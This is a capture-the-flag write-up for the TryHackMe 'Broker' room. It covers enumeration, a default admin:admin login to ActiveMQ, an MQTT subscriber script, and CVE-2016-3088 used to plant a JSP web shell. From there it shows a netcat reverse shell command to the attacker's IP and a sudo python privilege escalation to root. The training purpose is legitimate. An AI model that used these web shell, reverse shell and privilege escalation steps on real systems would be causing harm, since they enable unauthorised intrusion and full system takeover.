# 68 - Broker (ActiveMQ / mqtt exploitation)

Room Link --> [https://tryhackme.com/room/broker](https://tryhackme.com/room/broker)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.127.44 -p- -sV -T4 -T5

PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
1883/tcp  open  mqtt?      syn-ack
8161/tcp  open  http       syn-ack Jetty 7.6.9.v20130131
43859/tcp open  tcpwrapped syn-ack
```
{% endcode %}

Navigating to [http://10.10.127.44:8161/](http://10.10.127.44:8161/)

<figure><img src=".gitbook/assets/image (454).png" alt=""><figcaption></figcaption></figure>

#### Gobuster enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.127.44:8161/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -x txt,html,php -x 403,404,500

/images
/admin
/api 
/styles
```
{% endcode %}

Navigating to the Admin nel; i tried to login with `admin : admin` and it worked

<figure><img src=".gitbook/assets/image (455).png" alt=""><figcaption></figcaption></figure>

Looking at the result above one port came back as MQTT server and the other came back as Jetty. MQTT protocol provides a lightweight way of both publishing and subscribing models. Basically is acts as a lightweight messaging protocol. In our case it has null authentication enabled meaning we can subscribe to any published message without having any valid credentials. I decided to subscribe to any published models in the background .

At this point it is clear that we need to talk to the daemon `mqtt` running on port 1883(check nmap scans). So searching for a `mqtt` client found this:

> [_https://github.com/eclipse/paho.mqtt.python#getting-started_](https://github.com/eclipse/paho.mqtt.python#getting-started)

Also found this link very useful:

> [_http://www.steves-internet-guide.com/into-mqtt-python-client/_](http://www.steves-internet-guide.com/into-mqtt-python-client/)

But we still need a “topic” for `subscribe()` to subscribe to a topic and receive messages. This was found here:

> [http://10.10.127.44:8161/admin/xml/topics.jsp](http://10.10.127.44:8161/admin/xml/topics.jsp)

<figure><img src=".gitbook/assets/image (456).png" alt=""><figcaption></figcaption></figure>

So edited the code from GitHub link and added the topic,IP Address of the Target and the MQTT version which needed to be 3.1:

[https://gist.github.com/shamsherkhan852/cb0d884c7eded07e7b5cc3df529fca59#file-mqtt\_client-py](https://gist.github.com/shamsherkhan852/cb0d884c7eded07e7b5cc3df529fca59#file-mqtt\_client-py)

```python
#https://github.com/eclipse/paho.mqtt.python#getting-started
#https://shamsher-khan.medium.com/broker-tryhackme-writeup-93202a3f778
import paho.mqtt.client as mqtt

# The callback for when the client receives a CONNACK response from the server.
def on_connect(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))
    # Subscribing in on_connect() means that if we lose the connection and
    # reconnect then subscriptions will be renewed.
    client.subscribe("secret_chat")

# The callback for when a PUBLISH message is received from the server.
def on_message(client, userdata, msg):
    print(msg.topic+" "+str(msg.payload))

client = mqtt.Client(protocol=mqtt.MQTTv31)
client.on_connect = on_connect
client.on_message = on_message

client.connect("10.10.120.228", 1883, 60) # CHANGE THE IP ADDRESS TO THM's ROOMs IP

# Blocking call that processes network traffic, dispatches callbacks and
# handles reconnecting.
# Other loop*() functions are available that give a threaded interface and a
# manual interface.
client.loop_forever()
```

#### The videogame they were talking about:

<figure><img src=".gitbook/assets/image (457).png" alt=""><figcaption></figcaption></figure>

### Initial Access

Search google for an exploit for `ActiveMQ` and found this:

[https://github.com/gsheller/ActiveMQ\_putshell-CVE-2016-3088](https://github.com/gsheller/ActiveMQ\_putshell-CVE-2016-3088)

<figure><img src=".gitbook/assets/image (458).png" alt=""><figcaption></figcaption></figure>

And this put a web shell at [http://10.10.127.44:8161/admin/guo.jsp](http://10.10.127.44:8161/admin/guo.jsp)&#x20;

To execute the exploit we go here: [http://10.10.127.44:8161/admin/guo.jsp?pwd=gshell\&shell=id](http://10.10.127.44:8161/admin/guo.jsp?pwd=gshell\&shell=id)

<figure><img src=".gitbook/assets/image (459).png" alt=""><figcaption></figcaption></figure>

#### Rev Shell

I used this to get rev shell:

```
nc 10.18.88.214 9002 -e /bin/sh
```

[http://10.10.127.44:8161/admin/guo.jsp?pwd=gshell\&shell=nc%2010.18.88.214%209002%20-e%20/bin/sh](http://10.10.127.44:8161/admin/guo.jsp?pwd=gshell\&shell=nc%2010.18.88.214%209002%20-e%20/bin/sh)

<figure><img src=".gitbook/assets/image (460).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

`sudo -l` we can execute python as root.

<figure><img src=".gitbook/assets/image (461).png" alt=""><figcaption></figcaption></figure>

So we have RW priv on the subscribe.py file, we can replace it with malicious python code and get root.

`echo 'import pty\npty.spawn("/bin/sh")' > subscribe.py`&#x20;

`sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py`&#x20;

And i got root.

<figure><img src=".gitbook/assets/image (462).png" alt=""><figcaption></figcaption></figure>

Done!!
